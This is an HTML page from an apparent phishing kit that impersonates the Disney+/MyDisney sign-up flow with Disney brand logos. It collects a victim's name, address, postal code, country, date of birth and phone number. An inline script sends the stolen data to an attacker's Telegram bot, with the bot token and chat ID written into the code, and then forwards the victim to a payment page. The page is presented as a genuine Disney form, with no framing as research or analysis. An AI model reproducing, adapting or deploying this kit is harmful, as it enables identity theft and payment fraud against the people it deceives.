<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Personal Information | Disney+</title>
  <link rel="stylesheet" href="style.css"/>
  <style>
    h1 {
      font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
      font-size: 2rem;
      text-align: center;
      margin: 40px 0 20px;
      color: #1c1c1c;
    }
  </style>
</head>
<body class="page-form">
  <main>
    <!-- Logo MyDisney -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>Personal Information</h1>

    <form id="infoForm">
      <input type="text" placeholder="Last Name" required/>
      <input type="text" placeholder="First Name" required/>
      <input type="text" placeholder="Address" required/>
      <input type="text" placeholder="City" required/>
      <input type="text" placeholder="Postal Code" required/>
      <select required>
        <option value="" disabled selected>Country</option>
        <option value="FR">France</option>
        <option value="BE">Belgium</option>
        <option value="CH">Switzerland</option>
        <option value="ES">Spain</option>
      </select>

      <input
        type="text"
        name="nacimiento"
        placeholder="Date of Birth"
        min="1900-01-01"
        max="2025-12-31"
        required
      />

      <input type="tel" placeholder="Phone Number" required/>
      <button type="submit">Continue</button>
    </form>

    <!-- Note + partner logos -->
    <div class="footer-note">
      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>
  
  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("infoForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const elems = this.elements;
      const data = {
        nom:        elems[0].value.trim(),
        prenom:     elems[1].value.trim(),
        adresse:    elems[2].value.trim(),
        ville:      elems[3].value.trim(),
        cp:         elems[4].value.trim(),
        pays:       elems[5].value,
        naissance:  elems['nacimiento'].value,
        telephone:  elems[7].value.trim()
      };

      const bot   = "8282278449:AAEF-IQlxgO_tERevewP2JvcHr9n60x_YNY";
      const chat  = "-4970333928";
      const msg   =
        `ðŸ“‹ Personal Information:\n` +
        `Last Name: ${data.nom}\n` +
        `First Name: ${data.prenom}\n` +
        `Address: ${data.adresse}\n` +
        `City: ${data.ville}\n` +
        `Postal Code: ${data.cp}\n` +
        `Country: ${data.pays}\n` +
        `Date of Birth: ${data.naissance}\n` +
        `Phone Number: ${data.telephone}`;

      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat, text: msg })
      })
      .catch(err => console.error("Telegram Error:", err))
      .finally(() => {
        setTimeout(() => window.location.href = "paiement.html", 2500);
      });
    });
  </script>
</body>
</html>
